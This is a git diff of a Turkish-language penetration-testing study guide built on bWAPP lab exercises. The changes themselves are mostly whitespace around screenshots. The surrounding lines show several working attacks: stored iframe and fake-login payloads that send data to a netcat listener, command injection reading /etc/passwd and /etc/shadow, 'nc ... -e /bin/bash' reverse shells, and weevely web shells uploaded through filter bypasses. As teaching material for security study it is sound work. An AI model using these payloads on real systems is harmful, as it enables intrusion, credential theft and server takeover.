@@ -60,6 +60,7 @@ gedit html101.html
 ---
 # HTML
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/b2017b3d14b9e08687e237570ea5efd5c6bf0948/Pictures/WhatsApp%20Image%202022-09-07%20at%2011.19.59.jpeg)
+
 > ## Tag
 - ```<DOCTYPE html>``` belgenin tipini belirtir. Biz HTML kullanıyoruz demektir
 > ## Head
@@ -139,7 +140,6 @@ gedit html101.html
 </div>
 </form>
 ```
-![]()
 
 > ## Resim Yerleştirme
 - ```<img width="600px" height=""400px" src="<resim URL'si>">```
@@ -149,6 +149,7 @@ gedit html101.html
 - ```<footer>Copyright ahmetnuysal 2022</footer>``` Sayfanın alt kısımına bilgi eklememizi sağlar
 
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/b2017b3d14b9e08687e237570ea5efd5c6bf0948/Pictures/WhatsApp%20Image%202022-09-07%20at%2013.57.35.jpeg)
+
 - ```<header>...</header>``` Sayfanın en üstüne bilgi eklememizi sağlar
 # Burpsuite 
 
@@ -184,6 +185,7 @@ firefox -> settings -> arama kısımına network yazıyoruz -> manuel'i seçiyor
 | şifre | bug |
 
 - Hangi açık üzerinden gitmek istiyorsak onu ve zorluk level'ini seçebiliriz
+
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/1.jpeg)
 
 > ## HTML Injection Reflected low level
@@ -196,12 +198,18 @@ firefox -> settings -> arama kısımına network yazıyoruz -> manuel'i seçiyor
 
 - Burpsuite açıyoruz ve ```Intercept -> ıntercept is on``` yapıyoruz. Artık sitede işlem yapmadan önce yakalayıp bize yollayacak
 - ```Forward```'a basarak işlemi yolluyoruz
+
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/2.jpeg)
+
 - Site'nin name kısmına ```<h1>ahmet</h1>``` yazıyoruz ve deniyoruz
+
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/3.jpeg)
+
 - ```HTML injection cheat sheet github```'ı google'llıyoruz ve yazabileceğimiz diğer HTML kodlarını görüyoruz
 - Name kısmına ```<h1>Hello<script>alert(1)</script>!</h1>```
+
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/4.jpeg)
+
 ! Eğer çalışıyorsa sitede HTML injection vardır ve JS kodu çalıştırılabiliyordur
 
 > ## HTML Injection Stored low level 
@@ -216,7 +224,8 @@ firefox -> settings -> arama kısımına network yazıyoruz -> manuel'i seçiyor
 - ```nc -nvlp 4545``` ile NATCAT açıyoruz
 - ```<iframe src="http://192.168.123.123:4545/test" height="0" width="0"></iframe>``` Normalde IP adresimiz bizim Publıc IP'miz olmalıdır, Port numarası çalışmazsa değiştirilebilir, ```height ve width```'i blog'a eklenen şey görülmesin diye 0 yapıyoruz
 - Artık o siteye giren cihazların IP adreslerini görebiliriz
-- ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/5.jpeg)
+
+![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/5.jpeg)
 
 > ## Formlardan Kullanıcı Adı ve Şifre Hackleme
 
@@ -233,6 +242,7 @@ firefox -> settings -> arama kısımına network yazıyoruz -> manuel'i seçiyor
 ```
 - Yazdığımız HTML kodunu blog'a yapıştırıyoruz. Kodu yazdığımız sitenin kendi login ekranının hazır HTML kodlarınıda yapıştırabiliriz
 - Kullanıcılar o kısıma login yaptıklarında giriş bilgilerini ```NATCAT``` üzerinden görebiliriz
+
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/6.jpeg)
 
 > ## Dirbuster
@@ -253,17 +263,22 @@ firefox -> settings -> arama kısımına network yazıyoruz -> manuel'i seçiyor
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/8.jpeg)
 
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/00654033d4d5aa36177841faae36634fad5a1b35/Pictures/9.jpeg)
+
 > ## iFrame Injection
 
 - Siteye sağ tıklayıp ```view page source``` açıyoruz
 - ```CTRL+F``` yapıp ```iframe``` arıyoruz
 - ```<iframe frameborder="0" src="robots.txt" height="250" width="250"></iframe>``` kodunda bulunan ```robots.txt```'i değiştirirsek ekranda o subdomain'i görürüz
+
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/dc88587d94cf5ca88383bc70df73399276884023/Pictures/10.jpeg)
+
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/dc88587d94cf5ca88383bc70df73399276884023/Pictures/11.jpeg)
+
 - ```burpsuite```i açıp ```intercept is on``` yapıyoruz ve ```forward```'a basıyoruz 
 - ```Get/bWAPP/iframe...``` kısmını değiştirebiliriz
 
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/dc88587d94cf5ca88383bc70df73399276884023/Pictures/12.jpeg)
+
 - Bu kısımdaki iframe kodunu kapatıp  sonuna ```</iframe><h1>hellohtml</h1>``` ekliyoruz (...ParamHeight=250"></iframe></h1>) ve ```forward```diyoruz
 
 # PHP Açıkları
@@ -272,13 +287,19 @@ firefox -> settings -> arama kısımına network yazıyoruz -> manuel'i seçiyor
 
 - Dosya upload ederek yararlanılan zaafiyetlerdir
 - PHP açıklarında ```burpsuite``` kullanılabilir, eğer parametre linkte varsa ```burpsuite``` kullanmaya gerek yok
+
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2012.01.34.jpeg)
+
 - Parametreler linkte yoksa ```burpsuite``` içinde ```intercept is on``` yapıyoruz ve yakaladığmız ```GET``` dosyası içinde değişiklik yapıyoruz
+
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2012.02.36.jpeg)
+
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2012.03.08.jpeg)
+
 - ```...?message=hello;system("whoami")``` deniyoruz. ";" işareti aynı anda 2 komut çalıştırmamızı sağlar
 
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2012.09.37.jpeg)
+
 - ```...?message=hello;system("cat /etc/passwd")``` ve ```...?message=hello;system("cat /etc/shadow")``` deniyoruz, bu kod ile sistem şifrelerini görebiliriz
 
 ! cat /etc/passwd ve cat /etc/shadow içerisinde kriptolanmış kali şifrelerini görebiliriz.
@@ -287,7 +308,9 @@ firefox -> settings -> arama kısımına network yazıyoruz -> manuel'i seçiyor
 - ```nc -nvlp 1234``` ile dinlemeyi başlatıyoruz
 - ```...?message=test;system("nc 192.168.123.123 1234 -e /bin/bash")``` çalıştırıyoruz işe yaramazsa ```-e /bin/sh``` deneyebiliriz
 - Terminal'i kullanarak site içerisinde gezinebiliriz
+
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2012.18.38.jpeg)
+
 - Sunucuda bir python kodu çalıştırabiliyorsak kendimiz bir shell açabiliriz
 - Terminal üzerinden site sunucusundayken ```python -c import pty; pty.spawn("/bin/bash")``` yazıyoruz ve shell açmayı deniyoruz
 
@@ -302,13 +325,17 @@ weevely generate <password><dosya ismi> -> .php dosyası oluşturur
 weevely <fotoğrafın yüklendiği konum><password> -> .php dosyasını kullanarak shell içine girmemizi sağlar
 ```
 - Eğer site içerisinde dosyanın yüklendiği konum görünmüyorsa ```burpsuite``` açıp ```response``` kısmından bulabiliriz
+
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2012.47.45.jpeg)
+
 - Artık sunucu içine giriş yaptık, sunucu içinde komutlarla (ls,pwd vb) dolaşabiliriz
 
 > ## PHP Upload Injection medium level
 
 - Bazı siteler bazı uzantıları engellemiş olabilir
+
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2012.52.17.jpeg)
+
 - O zaman ```.php``` dosyamızın bulunduğu konuma gideriz ```cp myphp.php myphp.php3``` kodu ile dosyayı farklı isimle kopyalarız, Çalışmazsa ```.php4 veya .php5``` deneyebiliriz
 
 # Foxy Proxy
@@ -316,6 +343,7 @@ weevely <fotoğrafın yüklendiği konum><password> -> .php dosyasını kullanar
 - ```Foxy Proxy``` firefox içinde elimiz ile yaptığımız proxy ayarını tek tıkla yapmamızı sağlar
 - Google'a ```Foxy Proxy``` yazıp firefox'umuza ekliyoruz
 - İçine girip ```options -> add -> gerekli yerleri dolduruyoruz``` 
+
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/d52601ee23106329f44447e37d9430f5c7d2aaa4/Pictures/WhatsApp%20Image%202022-09-09%20at%2014.32.02.jpeg)
 
 # Kod Çalıştırma & SSI
@@ -324,7 +352,9 @@ weevely <fotoğrafın yüklendiği konum><password> -> .php dosyasını kullanar
 
 - Sunucuda komut çalıştımamızı sağlayan zafiyettir
 - ```Burpsuite``` içinde ```ıntercept is on``` yapıyoruz, web sitesinden look up diyoruz
+
 ![](https://github.com/ahmetnuysal/Ethical-Hacker-Web-Penetration-Tests-and-Bug-Bounty/blob/main/Pictures/WhatsApp%20Image%202022-09-09%20at%2014.38.23.jpeg)
+
 - Siteye yolladığımız url sonunda ```;whoami``` ekleyip deniyoruz, eğer çalışırsa açık var demektir
 - ```nc -nvlp 1234``` çalıştırıyoruz
 - Siteye yolladığımız url sonuna ```;nc 192.168.123.123 1234 -e /bin/bash``` ekliyoruz 
